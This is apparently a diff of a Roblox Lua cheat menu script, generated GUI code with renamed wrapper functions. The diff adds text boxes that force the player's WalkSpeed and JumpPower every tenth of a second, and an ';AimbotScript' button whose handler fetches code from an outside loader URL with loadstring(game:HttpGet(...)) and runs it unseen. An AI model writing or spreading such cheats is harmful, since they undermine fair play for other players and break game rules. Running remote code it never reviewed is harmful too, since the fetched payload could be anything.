@@ -15,6 +15,9 @@ local PlayerButton_4 = Instance.new("TextButton")
 local PlayerButton_5 = Instance.new("TextButton")
 local PlayerButton_6 = Instance.new("TextButton")
 local PlayerButton_7 = Instance.new("TextButton")
+local TextBox = Instance.new("TextBox")
+local TextBox_2 = Instance.new("TextBox")
+local PlayerButton_8 = Instance.new("TextButton")
 
 --Properties:
 
@@ -50,6 +53,7 @@ PlayerList.BorderColor3 = Color3.fromRGB(0, 0, 0)
 PlayerList.BorderSizePixel = 0
 PlayerList.Position = UDim2.new(-0.00504958024, 0, 0.138576776, 0)
 PlayerList.Size = UDim2.new(0, 197, 0, 230)
+PlayerList.CanvasPosition = Vector2.new(0, 200)
 
 PlayerButton.Name = "PlayerButton"
 PlayerButton.Parent = PlayerList
@@ -146,16 +150,52 @@ PlayerButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
 PlayerButton_7.TextSize = 21.000
 PlayerButton_7.TextWrapped = true
 
+TextBox.Parent = PlayerList
+TextBox.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Size = UDim2.new(0, 185, 0, 32)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Walkspeed"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 21.000
+
+TextBox_2.Parent = PlayerList
+TextBox_2.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
+TextBox_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox_2.BorderSizePixel = 0
+TextBox_2.Size = UDim2.new(0, 185, 0, 32)
+TextBox_2.Font = Enum.Font.SourceSans
+TextBox_2.PlaceholderColor3 = Color3.fromRGB(127, 127, 127)
+TextBox_2.PlaceholderText = "JumpPower"
+TextBox_2.Text = ""
+TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox_2.TextSize = 21.000
+
+PlayerButton_8.Name = "PlayerButton"
+PlayerButton_8.Parent = PlayerList
+PlayerButton_8.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
+PlayerButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PlayerButton_8.BorderSizePixel = 0
+PlayerButton_8.Position = UDim2.new(0.0050749029, 0, 0, 0)
+PlayerButton_8.Size = UDim2.new(0, 185, 0, 32)
+PlayerButton_8.Font = Enum.Font.SourceSans
+PlayerButton_8.Text = ";AimbotScript"
+PlayerButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerButton_8.TextSize = 21.000
+PlayerButton_8.TextWrapped = true
+
 -- Scripts:
 
-local function LEADBD_fake_script() -- Frame.LocalScript 
+local function VNDWB_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	script.Parent.Active = true
 	script.Parent.Draggable = true
 end
-coroutine.wrap(LEADBD_fake_script)()
-local function GXBWZNG_fake_script() -- PlayerButton_2.LocalScript 
+coroutine.wrap(VNDWB_fake_script)()
+local function BNBMUN_fake_script() -- PlayerButton_2.LocalScript 
 	local script = Instance.new('LocalScript', PlayerButton_2)
 
 	-- LocalScript inside the TextButton
@@ -174,8 +214,8 @@ local function GXBWZNG_fake_script() -- PlayerButton_2.LocalScript
 	end)
 	
 end
-coroutine.wrap(GXBWZNG_fake_script)()
-local function UQYMQYI_fake_script() -- PlayerButton_3.LocalScript 
+coroutine.wrap(BNBMUN_fake_script)()
+local function EZRWXVS_fake_script() -- PlayerButton_3.LocalScript 
 	local script = Instance.new('LocalScript', PlayerButton_3)
 
 	
@@ -210,8 +250,8 @@ local function UQYMQYI_fake_script() -- PlayerButton_3.LocalScript
 	end)
 	
 end
-coroutine.wrap(UQYMQYI_fake_script)()
-local function VIYJAL_fake_script() -- PlayerButton_4.LocalScript 
+coroutine.wrap(EZRWXVS_fake_script)()
+local function UUNPXY_fake_script() -- PlayerButton_4.LocalScript 
 	local script = Instance.new('LocalScript', PlayerButton_4)
 
 	
@@ -243,8 +283,8 @@ local function VIYJAL_fake_script() -- PlayerButton_4.LocalScript
 	end)
 	
 end
-coroutine.wrap(VIYJAL_fake_script)()
-local function HSUXN_fake_script() -- PlayerButton_5.LocalScript 
+coroutine.wrap(UUNPXY_fake_script)()
+local function HEHKIG_fake_script() -- PlayerButton_5.LocalScript 
 	local script = Instance.new('LocalScript', PlayerButton_5)
 
 	local Players = game:GetService("Players")
@@ -274,8 +314,8 @@ local function HSUXN_fake_script() -- PlayerButton_5.LocalScript
 		end
 	end)
 end
-coroutine.wrap(HSUXN_fake_script)()
-local function FIMLBP_fake_script() -- PlayerButton_6.LocalScript 
+coroutine.wrap(HEHKIG_fake_script)()
+local function DTCCHEC_fake_script() -- PlayerButton_6.LocalScript 
 	local script = Instance.new('LocalScript', PlayerButton_6)
 
 	
@@ -312,8 +352,8 @@ local function FIMLBP_fake_script() -- PlayerButton_6.LocalScript
 	end)
 	
 end
-coroutine.wrap(FIMLBP_fake_script)()
-local function XWSYBV_fake_script() -- PlayerButton_7.LocalScript 
+coroutine.wrap(DTCCHEC_fake_script)()
+local function XYVGCE_fake_script() -- PlayerButton_7.LocalScript 
 	local script = Instance.new('LocalScript', PlayerButton_7)
 
 	
@@ -339,4 +379,98 @@ local function XWSYBV_fake_script() -- PlayerButton_7.LocalScript
 	end)
 	
 end
-coroutine.wrap(XWSYBV_fake_script)()
+coroutine.wrap(XYVGCE_fake_script)()
+local function GPXR_fake_script() -- TextBox.LocalScript 
+	local script = Instance.new('LocalScript', TextBox)
+
+	
+	local Players = game:GetService("Players")
+	
+	local player = Players.LocalPlayer
+	local textBox = script.Parent
+	
+	local function applySpeed()
+		local speed = tonumber(textBox.Text)
+		if not speed then return end
+	
+		local character = player.Character
+		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	
+		if humanoid and humanoid.WalkSpeed ~= speed then
+			humanoid.WalkSpeed = speed
+		end
+	end
+	
+	textBox:GetPropertyChangedSignal("Text"):Connect(applySpeed)
+	
+	player.CharacterAdded:Connect(function()
+		task.wait(1)
+		applySpeed()
+	end)
+	
+	while true do
+		applySpeed()
+		task.wait(0.1)
+	end
+	
+end
+coroutine.wrap(GPXR_fake_script)()
+local function CERMQAY_fake_script() -- TextBox_2.LocalScript 
+	local script = Instance.new('LocalScript', TextBox_2)
+
+	
+	local Players = game:GetService("Players")
+	
+	local player = Players.LocalPlayer
+	local textBox = script.Parent
+	
+	local function applyJumpPower()
+		local jumpPower = tonumber(textBox.Text)
+		if not jumpPower then return end
+	
+		local character = player.Character
+		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	
+		if humanoid then
+			humanoid.UseJumpPower = true
+	
+			if humanoid.JumpPower ~= jumpPower then
+				humanoid.JumpPower = jumpPower
+			end
+		end
+	end
+	
+	textBox:GetPropertyChangedSignal("Text"):Connect(applyJumpPower)
+	
+	player.CharacterAdded:Connect(function()
+		task.wait(1)
+		applyJumpPower()
+	end)
+	
+	while true do
+		applyJumpPower()
+		task.wait(0.1)
+	end
+	
+end
+coroutine.wrap(CERMQAY_fake_script)()
+local function QWSY_fake_script() -- PlayerButton_8.LocalScript 
+	local script = Instance.new('LocalScript', PlayerButton_8)
+
+	-- LocalScript inside the TextButton
+	
+	local HttpService = game:GetService("HttpService")
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local success, err = pcall(function()
+			loadstring(game:HttpGet("https://luafrem.pages.dev/api/loader/b7801e53990c6c494438fc243627be51?key=5e3052251391b502221806a2db04b41d2da584751cafe27b6486e568cf269d09"))()
+		end)
+	
+		if not success then
+			warn("Error running script:", err)
+		end
+	end)
+	
+end
+coroutine.wrap(QWSY_fake_script)()
